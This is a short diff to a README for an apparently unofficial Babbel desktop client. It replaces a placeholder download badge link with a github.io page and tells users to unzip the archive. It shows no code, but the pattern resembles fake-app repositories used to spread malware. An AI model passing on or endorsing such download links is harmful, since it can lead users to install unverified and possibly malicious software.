@@ -6,7 +6,7 @@ This unofficial Babbel desktop client brings the popular language learning platf
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://babbel-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
